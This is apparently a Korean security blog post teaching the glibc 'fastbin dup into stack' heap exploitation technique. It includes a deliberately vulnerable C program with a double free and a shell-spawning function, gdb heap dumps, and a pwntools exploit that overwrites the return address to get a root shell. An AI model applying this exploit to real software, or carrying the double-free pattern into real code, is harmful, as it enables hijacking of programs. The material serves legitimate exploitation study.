---
title: Fastbin dup into Stack
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, fastbin dup]
math: true
mermaid: true
---

## Conditions

- 공격자에 의해 동일한 크기의 fast chunk의 할당과 해제가 자유로워야 한다.
- 공격자에 의해 해제된 fast chunk를 한 번 더 해제할 수 있어야 한다.(Double Free Bug)
- 공격자에 의해 할당된 fast chunk 영역에 값을 저장할 수 있어야 한다.
- 할당 받고자 하는 stack 영역에 해제된 fast chunk의 크기 값이 저장되어 있어야 한다.

## Exploit plan

1. 동일한 크기의 fast chunk(A, B, C) 3개 생성
2. 첫 번째 fast chunk(A) 해제
3. 두 번째 fast chunk(B) 해제
4. 첫 번째 fast chunk(A) 해제
5. 이전과 동일한 크기로 힙을 할당하고 해당 chunk 영역에 “stack 영역 주소 값 - prev_size 공간(0x8)” 덮어씀
6. 동일한 크기로 fast chunk 2개 생성
7. 다음에 할당하는 영역에 원하는 값을 씀
    - 할당된 영역은 “stack 영역의 주소 값 + 0x8” 영역

A -> B -> A 로 해제하는 이유는 동일한 공간을 연속으로 해제하는 경우 double free or corruption이 발생하기 때문이다. 5번째에 동일한 크기로 힙을 할당하는 경우 첫 번째 A가 할당되는데 여기에 값을 쓸 수 있다면 Fake Chunk로 조작이 가능하다.

원래 3 번째 A의 FD 값에는 아무 값도 없기 때문에 다음 청크가 없었지만, 첫 번째 A가 할당되면서 FD, BK 부분이 데이터 영역으로 변했고, Fake Chunk 값을 쓰면 세 번째 A의 FD가 변조된다.

### Fake chunk의 조건

- 이전 Chunk의 Size와 Fake Chunk의 Size가 동일해야 함
- 우리가 변조하고자 하는 주소보다 작은 주소에 위치해야 함

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void call_me(){
       system("/bin/sh");
}

int main()
{
        long stack_var = 0x0;
        scanf("%ld",&stack_var);
        printf("Stack_var : %p\n",&stack_var);

        char *buf1 = malloc(112);
        char *buf2 = malloc(112);
        char *buf3 = malloc(112);

        free(buf1);
        free(buf2);
        free(buf1);

        char *buf4 = malloc(112); 
        char *buf5 = malloc(112);

        scanf("%8s",buf4);

        char *buf6 = malloc(112); 
        char *buf7 = malloc(112);
        read(0,buf7,112);  
}
```

buf1을 2번 free 후 buf4에 scanf로 입력받는다. tail buf1의 fd는 null이지만 현재 buf4로 malloc을 해준 상태로 tail의 fd를 조작할 수 있다.

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x602820 --> 0x4141414141414141 (invaild memory)
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x6029a0 (size : 0x20660) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

fast chunk의 크기가 동일해야 하므로 stack 내 128(0x80)이 존재하는 부분을 확인한 후 해당 위치의 - 0x8 한 위치(0x7ffe2d26fa38)를 입력해야한다. (chunk의 시작) 0x7ffe2d26fa48부터 User Data이며 read로 입력받도록 만들었다.

```
gdb-peda$ x/4x 0x7ffe2d26fa38
0x7ffe2d26fa38: 0x0000000000400783  0x0000000000000080
0x7ffe2d26fa48: 0x000000000040080d  0x00007ffe2d26fa7e
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x112a420 --> 0x7ffe2d26fa38 --> 0x40080d (size error (0x415d5b08c48348e8)) --> 0xc35f415e415d415c (invaild memory)
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x112a5a0 (size : 0x20a60) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

read를 통해 main의 return 값을 변조하여 call_me로 분기가 가능하다.

```
gdb-peda$ x/24gx $rbp-0x48
0x7ffc9c05d7d8: 0x00000000004007b5  0x0000000000000080 <- Chunk Header
0x7ffc9c05d7e8: 0x4141414141414141  0x4141414141414141 <- User Data
0x7ffc9c05d7f8: 0x4141414141414141  0x4141414141414141
0x7ffc9c05d808: 0x4141414141414141  0x4141414141414141
0x7ffc9c05d818: 0x4141414141414141  0x4141414141414141
0x7ffc9c05d828: 0x00000000004006b6  0x000000000000000a
gdb-peda$ x/2x $rbp
0x7ffc9c05d820: 0x4141414141414141  0x00000000004006b6 <- ret
```

## Exploit code

```python
from pwn import *

call_me = 0x4006b6
p = process('./fastbin_dup')
#gdb.attach(p)
p.sendline("128")  # Set Chunk Size in Stack
stack_addr = int(p.recvline().split(' ')[2],16)
log.info('Stack Addr : ' + hex(stack_addr)) 
p.sendline(p64(stack_addr - 0x8)) # size - 0x8(Chunk)
#raw_input('1')
p.sendline("A"*0x40 + p64(call_me)) # Modulate Stack

p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/fastbin# python exploit.py 
[+] Starting local process './fastbin_dup': pid 4442
[*] Stack Addr : 0x7ffc3ed4ffc0
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [fastbin_dup_into_stack[English]](https://www.lazenca.net/pages/viewpage.action?pageId=51970214)
- [[HITCON Training] lab12 / Fastbin attack - 1](https://bachs.tistory.com/entry/HITCON-Training-lab12-Fastbin-Attack?category=961837)